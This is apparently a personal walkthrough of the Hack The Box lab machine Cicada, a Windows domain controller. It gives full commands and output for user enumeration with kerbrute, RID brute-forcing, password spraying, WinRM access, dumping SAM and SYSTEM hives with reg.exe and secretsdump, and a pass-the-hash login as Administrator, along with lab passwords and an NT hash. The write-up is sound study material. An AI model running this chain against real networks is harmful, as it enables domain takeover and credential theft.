#box #windows #kerbrute #SAM

>Group Policy Preferences is identified when a `Groups.xml` is found. If inside this file a `cpassword` field is found it's possible to decrypt it with the utility `gpp-decrypt`

Cicada is a machine that relies on enumeration capabilities and the knowledge of nxc (or the build up for cycle in bash to enumerate available RIDs in a system). Among enumerating the available RIDs we're able to spray the password find in SMB to discover the initial foothold. This foothold will permit us to enumerate LDAP, finding an open password written in the LDAP description. Once found this second password, it enables to the DEV share which will show a powershell script containing another credential. This credential grants us a second foothold through Remote Management with WinRM. Inside the machine, we have SeBackup/SeRestore but we've not enough control on the machine to leverage a backup recovery (can't exec `sc` and other utils). Finally, we discover we can extract SAM / SYSTEM to dump the secrets with impacket. Unable to crack the password we use a PtH attack to authenticate as NT AUTHORITY.
## Nmap

```bash
# Nmap 7.95 scan initiated Thu Aug 28 15:44:35 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.129.245.220
Nmap scan report for 10.129.245.220
Host is up (0.39s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-29 02:44:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2025-08-29T02:46:14+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2025-08-29T02:46:12+00:00; +7h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-29T02:46:12+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2025-08-29T02:46:12+00:00; +7h00m01s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=8/28%Time=68B0B1BE%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-29T02:45:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 28 15:46:13 2025 -- 1 IP address (1 host up) scanned in 98.71 seconds
```
## SMB

By accessing SMB with anonymous session on the `HR` share we discover the presence of a file called `Notice from HR`. We opt to get it on our local machine and by opening it we discover the presence of a clear-text password inside of it. The txt content resembles an email sent to a new user that is then supposed to be changed.

```share
smbclient -N //10.129.231.149/HR
get "Notice from HR.txt"
```

Password: `Cicada$M6Corpb*@Lp#nZp!8`

However, the main issue now is we don't have a clear idea of what users are available on the domain nor we know the pattern used to identify those users (like name.surname@, N.Surname@, surname@ etc.). We then opt to try a RID-Brute attack. Below the procedure is done automatically with the help of `nxc`, however this can also be done manually by following [this](obsidian://open?vault=Pentesting&file=Commands%20Cheatsheets%2FRPC%2FRID%20Enumeration) guide
## RPC RID-Brute

Since the `anonymous` user is denied to access the RPC features on RPC (we can try to do `lookupsids` on `rpcclient` to validate that), we need an alternative to find an user that at least has the rights to enumerate that. We opt to use `kerbrute` with a basic list, to discover whether any default account is present on the target system.


```bash
./kerbrute userenum -d cicada-dc.cicada.htb /usr/share/seclists/Usernames/top-usernames-shortlist.txt --dc CICADA-DC.cicada.htb -d cicada.htb

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/01/25 - Ronnie Flathers @ropnop

2025/09/01 13:39:18 >  Using KDC(s):
2025/09/01 13:39:18 >   CICADA-DC.cicada.htb:88

2025/09/01 13:39:18 >  [+] VALID USERNAME:       administrator@cicada.htb
2025/09/01 13:39:18 >  [+] VALID USERNAME:       guest@cicada.htb
2025/09/01 13:39:18 >  Done! Tested 17 usernames (2 valid) in 0.173 seconds
```

We try with `guest`, password-less, succeeding to access and bruteforce the available RID of the domain:

```bash
nxc smb 10.129.231.149 -u 'guest' -p '' --rid-brute
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

We now have an exhaustive list of users to password-spray with our initial password, so we add them into a file and then perform a password spray attack with `nxc`:

```bash
nxc smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [-] CICADA\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] CICADA\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        [-] CICADA\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] CICADA\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

Discovering a foothold: `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`
## Querying LDAP

Once with a foothold, the enumeration restarts but with an unlocked piece of the puzzle, LDAP. We then proceed to query LDAP with ldapsearch.

Discovering another password hidden in the description field. By removing the `grep` and using CTRL+F to find the given password on the whole scan, we discover this password belongs to the user: `david.orelious`. Obtaining `david.orelious:aRt$Lp#7t*VQ!3`, our second foothold.
## SMB 2

This new user have access to more shares than the anonymous user and `michael.wrightson`. Precisely, this user can now access DEV, NETLOGON and SYSVOL shares:

```bash
nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares             
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV             READ            
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share 
```

Inside the `DEV` share, we discover the presence of a file, a PowerShell file. We download it and by opening it we discover another pair of credentials: `emily.oscars:Q!3@Lp#M6b*7t*Vt`.
## Evil-WinRM

By performing a dump of the AD, we discover that `emily.oscars` is a Remote Management User, thus we opt to try connect with `evil-winrm`, obtaining remote connection to the DC

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i CICADA-DC.cicada.htb
```
## SAM Extraction

Our Remote Management user has `SeBackup` and `SeRestore` privileges, however we found no way to restore any previously made backup since the target seems to be pretty much locked. We do not have access to a lot of commands nor we can control `sc` to perform an attack over those privileges. At last, we discover that we're able to dump `SAM` and `SYSTEM`. We dump them 

```bash
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
```

and download them on our machine with `evil-winrm` command:

```bash
download sam.save
download system.save
```

Lastly, we dump the secrets with `impacket-secretsdump`:

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```
### PtH

After trying to crack the password unsuccessfully, we opt to use a PtH (the second hash `nthash` must be used) attack to authenticate as the Administrator within `evil-winrm`, succeeding and obtaining the control of the DC's Administrator:

```bash
evil-winrm -u Administrator -i CICADA-DC.cicada.htb -H 2b87e7c93a3e8a0ea4a581937016f341
```
